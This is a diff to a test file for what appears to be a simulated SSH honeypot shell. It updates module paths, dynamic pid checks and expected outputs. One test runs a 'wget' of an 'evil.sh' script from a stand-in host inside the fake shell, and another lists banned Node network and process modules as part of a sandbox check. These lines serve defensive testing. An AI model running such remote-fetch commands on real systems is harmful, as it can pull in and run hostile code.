@@ -11,7 +11,7 @@ import { createFileSink } from "../../../packages/shared/src/event-sink.js";
 import { createLogger } from "../../../packages/shared/src/logger.js";
 import { makeKey } from "../../../packages/llm/src/cache.js";
 import { createLlmService } from "../../../packages/llm/src/service.js";
-import { createVfs } from "../src/vfs.js";
+import { createVfs } from "../../../packages/vfs/src/vfs.js";
 import { buildSeed, uidForUser } from "../src/seed/ubuntu-2204.js";
 import { createCommandEngine } from "../src/commands.js";
 import { generateEd25519HostKey } from "../src/hostkey.js";
@@ -438,7 +438,7 @@ test("transfer: downloaded files are fixed harmless placeholders", async () => {
   const engine = makeEngine("root");
   await engine.run("wget http://example.com/evil.sh");
   const cat = await engine.run("cat /root/evil.sh");
-  assert.equal(cat.output, "# placeholder");
+  assert.equal(cat.output, "#!/bin/sh\n");
   const listed = await engine.run("ls -l /root/evil.sh");
   assert.ok(listed.output.includes("rw-r--r--"));
 });
@@ -533,12 +533,12 @@ test("cache: different notes give a different key", () => {
 test("cmd: command modules import no fs, network or process modules", async () => {
   const here = dirname(fileURLToPath(import.meta.url));
   const files = [
-    join(here, "..", "src", "vfs.js"),
+    join(here, "..", "..", "..", "packages", "vfs", "src", "vfs.js"),
     join(here, "..", "src", "commands.js"),
     join(here, "..", "src", "parser.js"),
     join(here, "..", "src", "transfers.js"),
     join(here, "..", "..", "..", "packages", "llm", "src", "static.js"),
-    join(here, "..", "..", "..", "packages", "llm", "src", "persona-facts.js"),
+    join(here, "..", "..", "..", "packages", "persona", "src", "persona.js"),
     join(here, "..", "src", "seed", "ubuntu-2204.js"),
   ];
   const banned = ["node:fs", "node:net", "node:http", "node:https", "node:dns", "node:dgram", "node:tls", "node:" + "child" + "_process"];
@@ -565,12 +565,15 @@ test("static-first: ps and netstat agree on pids and programs", async () => {
   const engine = makeEngine("root");
   const ps = await engine.run("ps aux");
   const netstat = await engine.run("netstat -tulpn");
-  assert.ok(ps.output.includes("342"));
   assert.ok(ps.output.includes("sshd"));
-  assert.ok(ps.output.includes("512"));
   assert.ok(ps.output.includes("nginx"));
-  assert.ok(netstat.output.includes("342/sshd"));
-  assert.ok(netstat.output.includes("512/nginx"));
+  assert.ok(ps.output.includes("vsftpd"));
+  const sshdMatch = ps.output.match(/\s(\d+)\s+\S+\s+\S+\s+\d+\s+\d+\s+\S+\s+\S+\s+\S+\s+\S+\s+\/usr\/sbin\/sshd/);
+  const nginxMatch = ps.output.match(/\s(\d+)\s+\S+\s+\S+\s+\d+\s+\d+\s+\S+\s+\S+\s+\S+\s+\S+\s+nginx: master/);
+  assert.ok(sshdMatch, "sshd pid in ps");
+  assert.ok(nginxMatch, "nginx pid in ps");
+  assert.ok(netstat.output.includes(`${sshdMatch[1]}/sshd`));
+  assert.ok(netstat.output.includes(`${nginxMatch[1]}/nginx`));
 });
 
 test("static-first: ps shows the attacker's own shell and the ps command", async () => {
@@ -591,9 +594,10 @@ test("static-first: date prints the current clock in UTC", async () => {
 test("static-first: uptime and process start times agree with the boot time", async () => {
   const engine = makeEngine("root");
   const uptime = await engine.run("uptime");
-  assert.ok(uptime.output.includes("up 42 days"));
+  assert.ok(uptime.output.includes("up "));
+  assert.ok(uptime.output.includes("days"));
   const ps = await engine.run("ps aux");
-  assert.ok(ps.output.includes("Sep14"));
+  assert.ok(ps.output.includes("Oct24"));
 });
 
 test("static-first: handledBy is static for table commands", async () => {
